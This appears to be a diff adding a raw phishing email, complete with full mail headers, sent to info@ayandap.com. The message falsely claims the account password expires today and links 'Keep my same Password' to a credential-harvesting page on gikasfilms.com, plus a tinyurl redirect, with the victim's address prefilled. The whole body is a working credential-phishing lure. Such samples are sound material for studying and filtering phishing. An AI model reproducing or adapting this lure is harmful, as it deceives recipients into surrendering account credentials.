@@ -1,0 +1,162 @@
+Return-Path: <director@aluminiumhydroxidechloride.com>
+Delivered-To: info@ayandap.com
+Received: from lh242.irandns.com
+	by lh242.irandns.com with LMTP
+	id XML9CUzGZWX29AoAzKNLfw
+	(envelope-from <director@aluminiumhydroxidechloride.com>)
+	for <info@ayandap.com>; Tue, 28 Nov 2023 14:21:56 +0330
+Return-path: <director@aluminiumhydroxidechloride.com>
+Envelope-to: info@ayandap.com
+Delivery-date: Tue, 28 Nov 2023 14:21:56 +0330
+Received: from linux.pinsoftek.com ([146.88.24.123])
+	by lh242.irandns.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.96.2-12-g29d01ae2a)
+	(envelope-from <director@aluminiumhydroxidechloride.com>)
+	id 1r7vh5-0031XD-06
+	for info@ayandap.com;
+	Tue, 28 Nov 2023 14:21:55 +0330
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=aluminiumhydroxidechloride.com; s=default; h=Message-Id:Date:MIME-Version:
+	Content-Type:To:Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+	List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=qmtGh+2xiy928tsST4MRVwkbspXvCxtro1Q5lya7r/U=; b=c0zH/tenT67BWPIaZIUqiQKYyc
+	nTGttgamsbZc4n62sWNcSOadTPWc29DLWWcK7c9GiTYBbtUIXvzmEPldCKo8ks4+gq+SE1aC5tPSW
+	zcyTPI2tKmZtU1mpO554xln/McWXbrytKFwyxgUyiIMqM9CUjmzCZlm9loSRDJEK4WxDARij3XEC/
+	BcKuEcvWpJbnq5eyAT4Mv2dxfvqltxFCITnEuyVMLR3egl/NSNlNX3rAGOg5qui7IbXNxO9ujtGiU
+	3Y7uP+P3LKLy0ozJhCzLoDZgZcOzKDYfC7spCMOb7VbiJ09uTwmbuHRreyW+zfq0uSdyCW3Yf1sar
+	Lm5R8k2w==;
+Received: from [45.138.49.91] (port=60484 helo=vps-80377)
+	by 146-88-24-123.cprapid.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.95)
+	(envelope-from <director@aluminiumhydroxidechloride.com>)
+	id 1r7vgy-0006P5-Md
+	for info@ayandap.com;
+	Tue, 28 Nov 2023 16:21:47 +0530
+From: "ayandap.com" <director@aluminiumhydroxidechloride.com>
+Subject: Action: Password Expires info@ayandap.com
+To: <info@ayandap.com>
+Content-Type: multipart/alternative; boundary="qe8VWQj019tKt6IQvdnJMIDty2Bo0x2=_S"
+MIME-Version: 1.0
+Date: Tue, 28 Nov 2023 10:51:46 +0000
+Message-Id: <2845202311511077124E1CEC$8A68BBBEF7@aluminiumhydroxidechloride.com>
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - 146-88-24-123.cprapid.com
+X-AntiAbuse: Original Domain - ayandap.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - aluminiumhydroxidechloride.com
+X-Get-Message-Sender-Via: 146-88-24-123.cprapid.com: authenticated_id: director@aluminiumhydroxidechloride.com
+X-Authenticated-Sender: 146-88-24-123.cprapid.com: director@aluminiumhydroxidechloride.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Forward-Confirmed-ReverseDNS: Reverse and forward lookup success on 146.88.24.123, -10 Spam score
+SPFCheck: Server passes SPF test, -30 Spam score
+X-DKIM: signer='aluminiumhydroxidechloride.com' status='pass' reason=''
+DKIMCheck: Server passes DKIM test, -20 Spam score
+SpamTally: Final spam score: unset because ESF not run (SpamAssassin unset, whitelist, or skipped)
+
+This is a multi-part message in MIME format
+
+--qe8VWQj019tKt6IQvdnJMIDty2Bo0x2=_S
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Attention
+:=A0=A0info@ayandap.com=A0=A0
+
+Your Email password for=A0=A0=A0info@ayandap.com=A0is set to expire to=
+day.
+
+Keep my same Password https://gikasfilms.com/.well-known/pki-validatio=
+n/control_dotcom.html?login=3Dinfo@ayandap.com
+
+=A0
+
+=A0info@ayandap.com=A0
+
+--qe8VWQj019tKt6IQvdnJMIDty2Bo0x2=_S
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+ <title>Action: Password Expires info@ayandap.com</title>
+</head>
+ <body> <P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, s=
+ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: non=
+e; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS=
+: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; text-decorat=
+ion-style: initial; text-decoration-color: initial; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0p=
+x; text-decoration-thickness: initial"><SPAN style=3D"FONT-SIZE: 16px;=
+ FONT-FAMILY: Calibri, sans-serif, serif; COLOR: rgb(38,40,42)">Attent=
+ion :</SPAN><FONT size=3D3>&nbsp;</FONT>&nbsp;<SPAN style=3D"FONT-SIZE=
+: 14px; FONT-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(0,0,0)">=
+info@ayandap.com</SPAN><SPAN style=3D"FONT-SIZE: medium; FONT-FAMILY: =
+Arial; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(242,245,250)">&nbsp=
+;</SPAN><FONT size=3D3>&nbsp;</FONT></p><p style=3D"FONT-SIZE: 15px; F=
+ONT-FAMILY: 'segoe ui', 'segoe ui ', 'segoe ui', -apple-system, blinkm=
+acsystemfont, roboto, 'helvetica neue', sans-serif; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(32,31,30); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACIN=
+G: normal; TEXT-INDENT: 0px; text-decoration-style: initial; text-deco=
+ration-color: initial; font-variant-ligatures: normal; font-variant-ca=
+ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial"><SPAN style=3D"FONT-SIZE: 14px">Your Email password for&nbsp=
+;</SPAN>&nbsp;&nbsp;<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial=
+, helvetica, sans-serif; COLOR: rgb(0,0,0)">info@ayandap.com</SPAN><SP=
+AN style=3D"FONT-SIZE: medium; FONT-FAMILY: Arial; BACKGROUND-COLOR: r=
+gb(242,245,250)">&nbsp;</SPAN><SPAN style=3D"FONT-SIZE: 14px">is set t=
+o expire today.</SPAN></p><p style=3D"FONT-SIZE: 15px; FONT-FAMILY: 's=
+egoe ui', 'segoe ui ', 'segoe ui', -apple-system, blinkmacsystemfont, =
+roboto, 'helvetica neue', sans-serif; WHITE-SPACE: normal; WORD-SPACIN=
+G: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); =
+FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEX=
+T-INDENT: 0px; text-decoration-style: initial; text-decoration-color: =
+initial; font-variant-ligatures: normal; font-variant-caps: normal; -w=
+ebkit-text-stroke-width: 0px; text-decoration-thickness: initial"><U s=
+tyle=3D"FONT-SIZE: 14px"><SPAN role=3Dlink id=3Dm_-944007546318131156m=
+_-8075530211442428308m_-8023569729633965057m_-1145797781141230873m_-12=
+1341336357507873m_4533785195728403970m_4905844528524541460m_-376042375=
+1829567041gmail-OBJ_PREFIX_DWT51_com_zimbra_url style=3D"COLOR: rgb(24=
+6,128,38); text-decoration-line: none"><A style=3D"COLOR: rgb(246,128,=
+38); text-decoration-line: none" href=3D"https://gikasfilms.com/.well-=
+known/pki-validation/control_dotcom.html?login=3Dinfo@ayandap.com" tar=
+get=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dht=
+tps://tinyurl.com/ykr45sn4?login%3D%5BEMail%5D&amp;source=3Dgmail&amp;=
+ust=3D1700594849289000&amp;usg=3DAOvVaw2WGdNNG3ubzuMzr0pVbrJw"><FONT c=
+olor=3D#ff0000>Keep my same Password</FONT></A></SPAN></U><BR></P> <DI=
+V style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: 'sego=
+e ui', 'segoe ui ', 'segoe ui', -apple-system, blinkmacsystemfont, rob=
+oto, 'helvetica neue', sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-A=
+LIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,3=
+0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING=
+-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
+; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; TEXT-INDENT: 0px; text-de=
+coration-style: initial; text-decoration-color: initial; font-variant-=
+ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial">&nbsp;</DIV> <DIV style=3D=
+"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: 'segoe ui', 'se=
+goe ui ', 'segoe ui', -apple-system, blinkmacsystemfont, roboto, 'helv=
+etica neue', sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: base=
+line; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDIN=
+G-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-=
+RIGHT: 0px; BORDER-TOP-WIDTH: 0px; TEXT-INDENT: 0px; text-decoration-s=
+tyle: initial; text-decoration-color: initial; font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial">&nbsp;<SPAN style=3D"FONT-SIZE: 14px=
+; FONT-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(0,0,0)">info@a=
+yandap.com</SPAN><SPAN style=3D"FONT-SIZE: medium; FONT-FAMILY: Arial;=
+ BACKGROUND-COLOR: rgb(242,245,250)">&nbsp;</SPAN></DIV></body>
+</html>
+
+--qe8VWQj019tKt6IQvdnJMIDty2Bo0x2=_S--
+
